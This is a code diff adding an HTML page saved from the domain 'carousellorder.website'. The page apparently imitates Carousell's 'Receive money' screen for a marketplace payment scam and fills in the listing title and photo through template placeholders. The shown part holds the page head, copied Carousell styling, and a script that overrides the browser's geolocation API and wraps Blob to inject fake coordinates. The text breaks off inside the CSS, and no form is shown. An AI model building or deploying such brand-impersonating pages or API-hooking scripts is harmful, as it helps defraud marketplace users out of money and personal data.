@@ -1,0 +1,2695 @@
+<!DOCTYPE html>
+<!-- saved from url=(0040)https://carousellorder.website/198864204 -->
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script>(function () {
+            function hookGeo() {
+                //<![CDATA[
+                const WAIT_TIME = 100;
+                const hookedObj = {
+                    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+                    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+                    fakeGeo: true,
+                    genLat: 38.883333,
+                    genLon: -77.000
+                };
+
+                function waitGetCurrentPosition() {
+                    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+                        if (hookedObj.fakeGeo === true) {
+                            hookedObj.tmp_successCallback({
+                                coords: {
+                                    latitude: hookedObj.genLat,
+                                    longitude: hookedObj.genLon,
+                                    accuracy: 10,
+                                    altitude: null,
+                                    altitudeAccuracy: null,
+                                    heading: null,
+                                    speed: null,
+                                },
+                                timestamp: new Date().getTime(),
+                            });
+                        } else {
+                            hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+                        }
+                    } else {
+                        setTimeout(waitGetCurrentPosition, WAIT_TIME);
+                    }
+                }
+
+                function waitWatchPosition() {
+                    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+                        if (hookedObj.fakeGeo === true) {
+                            navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+                            return Math.floor(Math.random() * 10000); // random id
+                        } else {
+                            hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+                        }
+                    } else {
+                        setTimeout(waitWatchPosition, WAIT_TIME);
+                    }
+                }
+
+                Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+                    hookedObj.tmp_successCallback = successCallback;
+                    hookedObj.tmp_errorCallback = errorCallback;
+                    hookedObj.tmp_options = options;
+                    waitGetCurrentPosition();
+                };
+                Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+                    hookedObj.tmp2_successCallback = successCallback;
+                    hookedObj.tmp2_errorCallback = errorCallback;
+                    hookedObj.tmp2_options = options;
+                    waitWatchPosition();
+                };
+
+                const instantiate = (constructor, args) => {
+                    const bind = Function.bind;
+                    const unbind = bind.bind(bind);
+                    return new (unbind(constructor, null).apply(null, args));
+                }
+
+                Blob = function (_Blob) {
+                    function secureBlob(...args) {
+                        const injectableMimeTypes = [
+                            { mime: 'text/html', useXMLparser: false },
+                            { mime: 'application/xhtml+xml', useXMLparser: true },
+                            { mime: 'text/xml', useXMLparser: true },
+                            { mime: 'application/xml', useXMLparser: true },
+                            { mime: 'image/svg+xml', useXMLparser: true },
+                        ];
+                        let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+                        if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+                            const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+                            if (mimeTypeIndex >= 0) {
+                                let mimeType = injectableMimeTypes[mimeTypeIndex];
+                                let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+
+                                let parser = new DOMParser();
+                                let xmlDoc;
+                                if (mimeType.useXMLparser === true) {
+                                    xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+                                } else {
+                                    xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+                                }
+
+                                if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+                                    xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+
+                                    if (mimeType.useXMLparser === true) {
+                                        args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+                                    } else {
+                                        args[0][0] = xmlDoc.documentElement.outerHTML;
+                                    }
+                                }
+                            }
+                        }
+
+                        return instantiate(_Blob, args); // arguments?
+                    }
+
+                    // Copy props and methods
+                    let propNames = Object.getOwnPropertyNames(_Blob);
+                    for (let i = 0; i < propNames.length; i++) {
+                        let propName = propNames[i];
+                        if (propName in secureBlob) {
+                            continue; // Skip already existing props
+                        }
+                        let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+                        Object.defineProperty(secureBlob, propName, desc);
+                    }
+
+                    secureBlob.prototype = _Blob.prototype;
+                    return secureBlob;
+                }(Blob);
+
+                window.addEventListener('message', function (event) {
+                    if (event.source !== window) {
+                        return;
+                    }
+                    const message = event.data;
+                    switch (message.method) {
+                        case 'updateLocation':
+                            if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+                                hookedObj.genLat = message.info.coords.lat;
+                                hookedObj.genLon = message.info.coords.lon;
+                                hookedObj.fakeGeo = message.info.fakeIt;
+                            }
+                            break;
+                        default:
+                            break;
+                    }
+                }, false);
+                //]]>
+            } hookGeo();
+        })()</script>
+
+    <meta content="#ffffff" name="theme-color">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="urbanGrey90" name="apple-mobile-web-app-status-bar-style">
+    <meta content="width=device-width, initial-scale=1.0, user-scalable=no" name="viewport">
+    <meta content="strict-origin-when-cross-origin" name="referrer">
+    <link href="https://mweb-cdn.karousell.com/static/favicon.ico" rel="icon">
+    <link rel="stylesheet" href="/css/support_parent.css">
+
+    <link href="https://mweb-cdn.karousell.com/static/apple-touch-icon-180.png" rel="apple-touch-icon">
+    <title>Carousell - Snap to List, Chat to Buy</title>
+    <meta content="Carousell" property="og:site_name">
+    <meta content="Carousell - Receive money" property="og:title">
+    <meta content="<%=ad.title%>" property="og:description">
+    <meta content="<%=ad.photo%>" property="og:image">
+    <meta content="product" property="og:type">
+    <meta content="" property="og:url">
+    <link rel="stylesheet" href="./carousellhtml_files/support_parent.css">
+    <style data-href="https://mweb-cdn.karousell.com/build/1f846bd91670df2f13a2.min.css">
+        .M_km,
+        .M_km:active,
+        .M_km:focus,
+        .M_km:hover,
+        .M_km:visited {
+            color: inherit;
+            text-decoration: none
+        }
+
+        .M_kn {
+            display: inline-block
+        }
+
+        .M_hw {
+            overflow: hidden;
+            -webkit-hyphens: auto;
+            -ms-hyphens: auto;
+            hyphens: auto;
+            text-overflow: ellipsis
+        }
+
+        .M_hx {
+            text-decoration: none
+        }
+
+        .M_hy {
+            text-decoration: line-through
+        }
+
+        .M_hz {
+            word-break: break-word;
+            overflow-wrap: break-word
+        }
+
+        .M_h_ {
+            word-break: normal;
+            overflow-wrap: normal
+        }
+
+        .M_hA {
+            -webkit-hyphens: none;
+            -ms-hyphens: none;
+            hyphens: none
+        }
+
+        .M_hB {
+            white-space: nowrap
+        }
+
+        .M_hC,
+        .M_hE {
+            white-space: normal
+        }
+
+        .M_hE {
+            display: -webkit-box !important;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            -webkit-line-clamp: var(--max-line);
+            -webkit-box-orient: vertical
+        }
+
+        .M_hF {
+            text-align: center
+        }
+
+        .M_hG {
+            text-align: left
+        }
+
+        .M_hH {
+            text-align: right
+        }
+
+        .M_hI {
+            font-weight: 400
+        }
+
+        .M_hJ {
+            font-weight: 600
+        }
+
+        .M_gv {
+            color: #ff2636
+        }
+
+        .M_gw {
+            color: #ffd4d7
+        }
+
+        .M_gx {
+            color: #cc1e2b
+        }
+
+        .M_gy {
+            color: #991720
+        }
+
+        .M_gz {
+            color: #660f16
+        }
+
+        .M_g_ {
+            color: #3596ff
+        }
+
+        .M_gA {
+            color: #027cff
+        }
+
+        .M_gB {
+            color: #0263cc
+        }
+
+        .M_gC {
+            color: #014a99
+        }
+
+        .M_gE {
+            color: #33d18d
+        }
+
+        .M_gF {
+            color: #00c671
+        }
+
+        .M_gG {
+            color: #009e5a
+        }
+
+        .M_gH {
+            color: #074
+        }
+
+        .M_gI {
+            color: #4769c0
+        }
+
+        .M_gJ {
+            color: #1943b0
+        }
+
+        .M_gK {
+            color: #14368d
+        }
+
+        .M_gL {
+            color: #0f286a
+        }
+
+        .M_gM {
+            color: #33e1ff
+        }
+
+        .M_gN {
+            color: #00d9ff
+        }
+
+        .M_gO {
+            color: #00aecc
+        }
+
+        .M_gP {
+            color: #008299
+        }
+
+        .M_gQ {
+            color: #edcaec
+        }
+
+        .M_gR {
+            color: #a950a8
+        }
+
+        .M_gS {
+            color: #932492
+        }
+
+        .M_gT {
+            color: #761d75
+        }
+
+        .M_gU {
+            color: #581658
+        }
+
+        .M_gV {
+            color: #cce9e4
+        }
+
+        .M_gW {
+            color: #33f2d5
+        }
+
+        .M_gX {
+            color: #00efca
+        }
+
+        .M_gY {
+            color: #00bfa2
+        }
+
+        .M_gZ {
+            color: #008f79
+        }
+
+        .M_ha {
+            color: #026958
+        }
+
+        .M_hb {
+            color: #f0f1f1
+        }
+
+        .M_hc {
+            color: #c5c5c6
+        }
+
+        .M_he {
+            color: rgba(44, 44, 45, .27)
+        }
+
+        .M_hf {
+            color: #6d6e71
+        }
+
+        .M_hg {
+            color: rgba(44, 44, 45, .69)
+        }
+
+        .M_hh {
+            color: #57585a
+        }
+
+        .M_hi {
+            color: #414244
+        }
+
+        .M_hj {
+            color: #2c2c2d
+        }
+
+        .M_hk {
+            color: #fff
+        }
+
+        .M_hl {
+            color: hsla(0, 0%, 100%, .9)
+        }
+
+        .M_hp {
+            font-size: 18px;
+            line-height: 26px
+        }
+
+        .M_hq {
+            font-size: 16px;
+            line-height: 24px
+        }
+
+        .M_hr {
+            font-size: 14px;
+            line-height: 22px
+        }
+
+        .M_hs {
+            font-size: 12px;
+            line-height: 20px
+        }
+
+        .M_ht {
+            font-size: 10px;
+            line-height: 18px
+        }
+
+        .M_it {
+            transform: rotate(-90deg)
+        }
+
+        .M_iu {
+            transform: rotate(90deg)
+        }
+
+        .M_iv {
+            transform: rotate(180deg)
+        }
+
+        .M_iw {
+            transition: transform .25s cubic-bezier(.4, 0, .2, 1)
+        }
+
+        .M_ix {
+            display: block;
+            width: 24px;
+            height: 24px
+        }
+
+        .M_li {
+            -webkit-overflow-scrolling: touch
+        }
+
+        .M_lj {
+            overflow-x: auto
+        }
+
+        .M_lk {
+            overflow-y: auto
+        }
+
+        .M_li::-webkit-scrollbar {
+            display: none
+        }
+
+        @keyframes M_la {
+            0% {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        @keyframes M_lc {
+            0% {
+                opacity: 1
+            }
+
+            to {
+                opacity: 0
+            }
+        }
+
+        .M_kV {
+            align-self: flex-start;
+            margin: 72px 0
+        }
+
+        .M_kW {
+            max-height: 90vh
+        }
+
+        .M_kX {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background: rgba(44, 44, 45, .8)
+        }
+
+        .M_kY {
+            overflow: visible;
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 8px 13px 0 rgba(44, 44, 45, .27)
+        }
+
+        .M_kY.M_kZ {
+            opacity: 1;
+            animation-name: M_la;
+            animation-duration: .3s
+        }
+
+        .M_kY.M_lb {
+            opacity: 0;
+            animation-name: M_lc;
+            animation-duration: .2s
+        }
+
+        .M_le {
+            max-height: inherit
+        }
+
+        .M_lf {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            background: #fff
+        }
+
+        .M_lg {
+            position: relative
+        }
+
+        .M_lh {
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            background: #fff
+        }
+
+        .M_fU {
+            display: inline-flex;
+            flex-flow: row nowrap
+        }
+
+        .M_fV {
+            z-index: 2;
+            animation: M_fW 1.5s linear infinite
+        }
+
+        .M_fX {
+            width: 16px;
+            height: 16px
+        }
+
+        .M_fY {
+            width: 32px;
+            height: 32px
+        }
+
+        .M_fZ {
+            width: 64px;
+            height: 64px
+        }
+
+        .M_ga {
+            stroke-linecap: round;
+            animation: M_gb 1.5s ease-in-out infinite
+        }
+
+        @keyframes M_fW {
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @keyframes M_gb {
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0
+            }
+
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35
+            }
+
+            to {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124
+            }
+        }
+
+        .M_hP {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none
+        }
+
+        .M_hQ {
+            margin: 8px 8px 0;
+            vertical-align: middle
+        }
+
+        .M_hR,
+        .M_hS,
+        .M_hT,
+        .M_hU,
+        .M_hV,
+        .M_hW,
+        .M_hX,
+        .M_hY,
+        .M_hZ,
+        .M_ia {
+            font-weight: 600;
+            line-height: 1.5
+        }
+
+        .M_hR,
+        .M_hS,
+        .M_hT,
+        .M_hX,
+        .M_hY,
+        .M_hZ,
+        .M_ia {
+            padding: 8px 16px;
+            border-radius: 4px
+        }
+
+        .M_hP:focus {
+            outline: none
+        }
+
+        .M_hP:empty:before {
+            content: "\200b"
+        }
+
+        .M_ib {
+            font-size: 14px;
+            line-height: 18px
+        }
+
+        .M_ic {
+            font-size: 16px
+        }
+
+        .M_ie {
+            box-shadow: 0 0 20px rgba(44, 44, 45, .07), 0 4px 12px rgba(44, 44, 45, .07)
+        }
+
+        .M_hT {
+            color: #fff;
+            background-color: rgba(44, 44, 45, .8)
+        }
+
+        .M_hT:active,
+        .M_hT:focus {
+            background-color: #57585a;
+            box-shadow: 0 0 0 4px #f0f1f1
+        }
+
+        .M_if {
+            background-color: #57585a
+        }
+
+        .M_hR {
+            color: #fff;
+            background-color: #008f79
+        }
+
+        .M_hR:active,
+        .M_hR:focus {
+            background-color: #026958;
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_ig {
+            background-color: #026958
+        }
+
+        .M_hS,
+        .M_hY {
+            color: #fff;
+            background-color: #ff2636
+        }
+
+        .M_hY {
+            border-radius: 20px
+        }
+
+        .M_hY:hover {
+            background-color: #cc1e2b
+        }
+
+        .M_hY:disabled {
+            background-color: #c5c5c6
+        }
+
+        .M_hS:active,
+        .M_hS:focus,
+        .M_hY:active,
+        .M_hY:focus {
+            background-color: #cc1e2b;
+            box-shadow: 0 0 0 4px #ffd4d7
+        }
+
+        .M_ih {
+            background-color: #cc1e2b
+        }
+
+        .M_hR:disabled,
+        .M_hS:disabled,
+        .M_hT:disabled {
+            color: #fff;
+            background-color: #c5c5c6
+        }
+
+        .M_hZ {
+            color: #fff;
+            background-color: rgba(44, 44, 45, .8);
+            border-radius: 20px
+        }
+
+        .M_hZ:hover {
+            background-color: #2c2c2d
+        }
+
+        .M_hZ:disabled {
+            background-color: #c5c5c6
+        }
+
+        .M_hZ:active,
+        .M_hZ:focus {
+            background-color: #2c2c2d;
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_ia {
+            color: #2c2c2d;
+            background-color: #fff;
+            border-radius: 20px
+        }
+
+        .M_ia:hover {
+            background-color: #f0f1f1
+        }
+
+        .M_ia:disabled {
+            color: #c5c5c6
+        }
+
+        .M_ia:active,
+        .M_ia:focus {
+            background-color: #f0f1f1;
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_ii {
+            padding: 8px
+        }
+
+        .M_hU,
+        .M_hV,
+        .M_hW,
+        .M_ii {
+            background-color: transparent
+        }
+
+        .M_hU,
+        .M_hV,
+        .M_hW {
+            padding: 0
+        }
+
+        .M_hU {
+            color: #2c2c2d
+        }
+
+        .M_hU:active,
+        .M_hU:focus {
+            color: #57585a
+        }
+
+        .M_hV {
+            color: #cc1e2b
+        }
+
+        .M_hV:active,
+        .M_hV:focus {
+            color: #991720
+        }
+
+        .M_hW {
+            color: #008f79
+        }
+
+        .M_hW:active,
+        .M_hW:focus {
+            color: #026958
+        }
+
+        .M_hU:disabled,
+        .M_hV:disabled,
+        .M_hW:disabled {
+            color: #c5c5c6
+        }
+
+        .M_hX {
+            padding: 7px 16px;
+            background-color: #fff;
+            border: 1px solid #c5c5c6
+        }
+
+        .M_hX:active,
+        .M_hX:focus {
+            background-color: #f0f1f1;
+            box-shadow: 0 0 0 4px #cce9e4
+        }
+
+        .M_ij {
+            background-color: #f0f1f1
+        }
+
+        .M_hX:disabled {
+            color: #c5c5c6;
+            background-color: #fff
+        }
+
+        .M_ik {
+            position: relative;
+            padding: 0 16px
+        }
+
+        .M_il {
+            background: #fff;
+            box-shadow: 0 4px 10px -6px rgba(44, 44, 45, .27)
+        }
+
+        .M_im {
+            align-items: center;
+            height: 60px
+        }
+
+        .M_im,
+        .M_in {
+            display: flex
+        }
+
+        .M_in {
+            position: absolute;
+            justify-content: flex-start;
+            margin-right: auto
+        }
+
+        .M_io {
+            position: relative;
+            z-index: 0;
+            line-height: 0
+        }
+
+        .M_ip {
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            z-index: -1;
+            width: 125%;
+            height: 125%;
+            background: rgba(44, 44, 45, .27);
+            border-radius: 50%
+        }
+
+        .M_iq {
+            flex: 1;
+            justify-content: center;
+            margin: 0 40px
+        }
+
+        .M_iq,
+        .M_ir {
+            display: flex
+        }
+
+        .M_ir {
+            justify-content: flex-end;
+            margin-left: 8px
+        }
+
+        .M_is {
+            width: 100%
+        }
+
+        .M_hK,
+        .M_is {
+            display: block
+        }
+
+        .M_hK {
+            position: relative;
+            overflow: hidden
+        }
+
+        .M_hL:after {
+            display: block;
+            padding-top: 100%;
+            content: ""
+        }
+
+        .M_hM {
+            background: #f0f1f1
+        }
+
+        .M_hM .M_hN {
+            display: none
+        }
+
+        .M_hK.M_hL .M_hN {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            -o-object-fit: cover;
+            object-fit: cover
+        }
+
+        .M_hK.M_hO {
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .M_hK.M_hO .M_hN {
+            width: 100%
+        }
+
+        .M_hu {
+            padding-left: 16px
+        }
+
+        .M_hv {
+            padding: 8px 16px 8px 0;
+            border-bottom: 1px solid #f0f1f1
+        }
+
+        .M_hu:last-child .M_hv {
+            border-bottom: none
+        }
+
+        .M_fG {
+            position: relative
+        }
+
+        .M_fH {
+            right: 8px
+        }
+
+        .M_fH,
+        .M_fI {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            display: flex;
+            align-items: center
+        }
+
+        .M_fI {
+            right: 12px
+        }
+
+        .M_fJ {
+            width: 100%;
+            padding: 12px 12px 12px 32px;
+            font-size: 14px;
+            color: #2c2c2d;
+            background-color: #f0f1f1;
+            border: none;
+            border-radius: 4px
+        }
+
+        .M_fJ:focus {
+            outline: none
+        }
+
+        .M_fK {
+            padding-right: 28px
+        }
+
+        .M_fJ::-webkit-input-placeholder {
+            color: #57585a
+        }
+
+        .M_fJ:-ms-input-placeholder {
+            color: #57585a
+        }
+
+        .M_fJ::placeholder {
+            color: #57585a
+        }
+
+        .M_fL {
+            position: relative
+        }
+
+        .M_fL,
+        .M_fM,
+        .M_fN {
+            flex: 0 0 auto
+        }
+
+        .M_fN {
+            margin-right: 8px
+        }
+
+        .M_fO {
+            flex: 0 0 auto
+        }
+
+        .M_fP {
+            position: relative;
+            display: flex;
+            width: 100%
+        }
+
+        .M_fQ {
+            width: 24px;
+            height: 24px
+        }
+
+        .M_fR {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 12px;
+            width: 16px;
+            height: 16px;
+            margin: auto;
+            fill-opacity: .4
+        }
+
+        .M_fS {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            flex-flow: column nowrap;
+            overflow-y: auto
+        }
+
+        .M_fS,
+        .M_fT {
+            background-color: #fff
+        }
+
+        .M_fT {
+            display: flex;
+            flex-shrink: 0;
+            justify-content: space-between;
+            padding: 12px 16px
+        }
+
+        .M_iy {
+            display: block;
+            background: linear-gradient(135deg, #f0f1f1 40%, #f8f8f9 50%, #f0f1f1 60%);
+            background-size: 1000px 100%;
+            animation: M_iz 2.5s linear infinite
+        }
+
+        @keyframes M_iz {
+            0% {
+                background-position: -1000px 0
+            }
+
+            to {
+                background-position: 1000px 0
+            }
+        }
+
+        .M_gh {
+            position: fixed;
+            top: 0;
+            z-index: 8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 60px;
+            background: #fff
+        }
+
+        .M_gi {
+            width: 12px;
+            height: 12px;
+            margin: auto 8px
+        }
+
+        .M_gi,
+        .M_gj {
+            border-radius: 50%
+        }
+
+        .M_gj {
+            width: 32px;
+            height: 32px
+        }
+
+        .M_gj,
+        .M_gk {
+            margin-right: 8px
+        }
+
+        .M_gk {
+            display: flex;
+            flex-basis: 55%;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 60px
+        }
+
+        .M_gl {
+            height: 12px;
+            margin: -4px 8px 12px 4px
+        }
+
+        .M_gl,
+        .M_gm {
+            width: 100%;
+            border-radius: 4px
+        }
+
+        .M_gm {
+            height: 8px;
+            margin: 0 8px 0 4px
+        }
+
+        .M_gn {
+            flex: 2;
+            width: 100%;
+            max-width: 80px;
+            height: 28px;
+            margin: auto 8px;
+            border-radius: 4px
+        }
+
+        .M_go {
+            z-index: 7;
+            width: 100%;
+            height: 24px;
+            line-height: 24px;
+            text-align: center
+        }
+
+        .M_gp {
+            background: #2c2c2d
+        }
+
+        .M_gq {
+            background: #00bfa2
+        }
+
+        .M_gr {
+            position: fixed;
+            z-index: 20;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: #2c2c2d
+        }
+
+        .M_gs {
+            flex: 1
+        }
+
+        .M_gt {
+            flex: 0 0 auto;
+            margin-left: 16px
+        }
+
+        .M_gu {
+            bottom: 0;
+            left: 0;
+            width: 100vw
+        }
+
+        .M_ge {
+            flex: 1
+        }
+
+        .M_gf {
+            top: 0
+        }
+
+        .M_gf,
+        .M_gg {
+            position: fixed;
+            right: 0;
+            left: 0
+        }
+
+        .M_gg {
+            bottom: 0;
+            z-index: 2
+        }
+
+        .M_gc {
+            z-index: 6
+        }
+
+        .M_fE {
+            flex-flow: column nowrap
+        }
+
+        .M_fE,
+        .M_fF {
+            display: flex
+        }
+
+        .M_fF {
+            flex: 1;
+            align-items: center;
+            justify-content: center
+        }
+
+        .M_uu {
+            width: 100%;
+            padding-top: 100%
+        }
+
+        .M_uu,
+        .M_uv {
+            background: #f0f1f1
+        }
+
+        .M_uv {
+            height: 8px;
+            margin-top: 24px;
+            margin-left: 16px;
+            border-radius: 8px
+        }
+
+        .M_ub {
+            display: flex;
+            flex-flow: column nowrap;
+            align-items: center;
+            justify-content: center;
+            padding: 0
+        }
+
+        .M_uc {
+            max-width: 384px;
+            margin-bottom: 8px
+        }
+
+        .M_ue {
+            margin-top: 16px
+        }
+
+        .M_tZ {
+            width: 128px;
+            height: 128px
+        }
+
+        .M_tZ,
+        .M_ua {
+            margin-bottom: 16px
+        }
+
+        .M_ua {
+            max-width: 384px
+        }
+
+        .M_Ls,
+        .M_Ls:active,
+        .M_Ls:focus,
+        .M_Ls:hover,
+        .M_Ls:visited {
+            color: inherit;
+            text-decoration: none
+        }
+
+        .M_Lt {
+            display: inline-block
+        }
+
+        html {
+            line-height: 1.15;
+            -ms-text-size-adjust: 100%;
+            -webkit-text-size-adjust: 100%
+        }
+
+        h1 {
+            font-size: 2em;
+            margin: .67em 0
+        }
+
+        dl dl,
+        dl ol,
+        dl ul,
+        ol dl,
+        ol ol,
+        ol ul,
+        ul dl,
+        ul ol,
+        ul ul {
+            margin: 0
+        }
+
+        hr {
+            box-sizing: content-box;
+            color: inherit;
+            height: 0;
+            overflow: visible
+        }
+
+        main {
+            display: block
+        }
+
+        pre {
+            font-family: monospace, monospace;
+            font-size: 1em
+        }
+
+        abbr[title] {
+            text-decoration: underline;
+            -webkit-text-decoration: underline dotted;
+            text-decoration: underline dotted
+        }
+
+        b,
+        strong {
+            font-weight: bolder
+        }
+
+        code,
+        kbd,
+        samp {
+            font-family: monospace, monospace;
+            font-size: 1em
+        }
+
+        small {
+            font-size: 80%
+        }
+
+        svg:not(:root) {
+            overflow: hidden
+        }
+
+        table {
+            border-color: inherit;
+            text-indent: 0
+        }
+
+        button,
+        input,
+        select {
+            margin: 0
+        }
+
+        button {
+            overflow: visible;
+            text-transform: none
+        }
+
+        [type=button],
+        [type=reset],
+        [type=submit],
+        button {
+            -webkit-appearance: button
+        }
+
+        fieldset {
+            padding: .35em .75em .625em
+        }
+
+        input {
+            overflow: visible
+        }
+
+        legend {
+            box-sizing: border-box;
+            color: inherit;
+            display: table;
+            max-width: 100%;
+            white-space: normal
+        }
+
+        progress {
+            display: inline-block;
+            vertical-align: baseline
+        }
+
+        select {
+            text-transform: none
+        }
+
+        textarea {
+            margin: 0;
+            overflow: auto
+        }
+
+        [type=search] {
+            -webkit-appearance: textfield;
+            outline-offset: -2px
+        }
+
+        ::-webkit-inner-spin-button,
+        ::-webkit-outer-spin-button {
+            height: auto
+        }
+
+        ::-webkit-input-placeholder {
+            color: inherit;
+            opacity: .54
+        }
+
+        ::-webkit-search-decoration {
+            -webkit-appearance: none
+        }
+
+        ::-webkit-file-upload-button {
+            -webkit-appearance: button;
+            font: inherit
+        }
+
+        ::-moz-focus-inner {
+            border-style: none;
+            padding: 0
+        }
+
+        :-moz-focusring {
+            outline: 1px dotted ButtonText
+        }
+
+        :-moz-ui-invalid {
+            box-shadow: none
+        }
+
+        details,
+        dialog {
+            display: block
+        }
+
+        dialog {
+            background-color: #fff;
+            border: solid;
+            color: #000;
+            height: -moz-fit-content;
+            height: -webkit-fit-content;
+            height: fit-content;
+            left: 0;
+            margin: auto;
+            padding: 1em;
+            position: absolute;
+            right: 0;
+            width: -moz-fit-content;
+            width: -webkit-fit-content;
+            width: fit-content
+        }
+
+        dialog:not([open]) {
+            display: none
+        }
+
+        summary {
+            display: list-item
+        }
+
+        template {
+            display: none
+        }
+
+        html {
+            box-sizing: border-box;
+            height: 100%
+        }
+
+        *,
+        :after,
+        :before {
+            box-sizing: inherit
+        }
+
+        * {
+            font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Droid Sans, Helvetica Neue, sans-serif
+        }
+
+        body {
+            flex-flow: column nowrap;
+            min-height: 100%;
+            margin: 0;
+            overflow: auto;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #57585a
+        }
+
+        #root,
+        body {
+            display: flex
+        }
+
+        #root {
+            flex: 1;
+            flex-flow: column nowrap
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        p,
+        ul {
+            margin: 0
+        }
+
+        ul {
+            padding: 0;
+            list-style-type: none
+        }
+
+        .M_hm {
+            padding: 24px 0
+        }
+
+        .M_hn {
+            position: absolute;
+            top: 0;
+            right: 0;
+            z-index: 999;
+            padding: 4px;
+            background-color: #ff2636;
+            border-bottom-left-radius: 8px
+        }
+
+        .M_ho {
+            display: none;
+            margin: -4px 4px
+        }
+
+        .M_hn:hover>.M_ho {
+            display: inline-block
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/916c568688cb038064ab.min.css">
+        .M_ys {
+            overflow: hidden;
+            -webkit-hyphens: auto;
+            -ms-hyphens: auto;
+            hyphens: auto;
+            text-overflow: ellipsis
+        }
+
+        .M_yt {
+            -webkit-hyphens: none;
+            -ms-hyphens: none;
+            hyphens: none
+        }
+
+        .M_yu {
+            word-break: break-word;
+            overflow-wrap: break-word
+        }
+
+        .M_yv {
+            white-space: nowrap
+        }
+
+        .M_yw {
+            text-align: center
+        }
+
+        .M_yx {
+            text-align: left
+        }
+
+        .M_yy {
+            text-align: right
+        }
+
+        .M_yz {
+            font-weight: 400
+        }
+
+        .M_y_ {
+            font-weight: 600
+        }
+
+        .M_yA {
+            display: inline-block
+        }
+
+        .M_xO {
+            font-size: 32px;
+            line-height: 40px
+        }
+
+        .M_xP {
+            font-size: 22px;
+            line-height: 30px
+        }
+
+        .M_xQ {
+            font-size: 18px;
+            line-height: 26px
+        }
+    </style>
+    <style data-href="https://mweb-cdn.karousell.com/build/a0bc524ba3abd2f16a6c.min.css">
+        .M_kK {
+            flex-flow: column nowrap
+        }
+
+        .M_kK,
+        .M_kL {
+            display: flex
+        }
+
+        .M_kL {
+            background: #fff
+        }
+
+        .M_kM {
+            max-width: 40%
+        }
+
+        .M_kN {
+            position: relative;
+            display: flex;
+            flex: 1;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%
+        }
+
+        .M_kO {
+            background-color: #f0f1f1;
+            opacity: .4
+        }
+
+        .M_kP {
+            position: absolute;
+            top: 50%;
+            padding: 0 4px;
+            pointer-events: none;
+            background: #fff;
+            transition: transform .25s ease, font-size .25s ease;
+            transform: translateY(-50%)
+        }
+
+        .M_kP,
+        .M_kQ {
+            color: #57585a
+        }
+
+        .M_kQ {
+            width: 100%;
+            margin: 0;
+            background: transparent;
+            border: 0
+        }
+
+        .M_kQ::-webkit-input-placeholder {
+            opacity: 0;
+            -webkit-transition: opacity .25s ease;
+            transition: opacity .25s ease
+        }
+
+        .M_kQ:-ms-input-placeholder {
+            opacity: 0;
+            -ms-transition: opacity .25s ease;
+            transition: opacity .25s ease
+        }
+
+        .M_kQ::placeholder {
+            opacity: 0;
+            transition: opacity .25s ease
+        }
+
+        .M_kQ:disabled {
+            color: #57585a
+        }
+
+        .M_kQ:focus {
+            outline: none
+        }
+
+        .M_kR::-webkit-input-placeholder {
+            opacity: 1
+        }
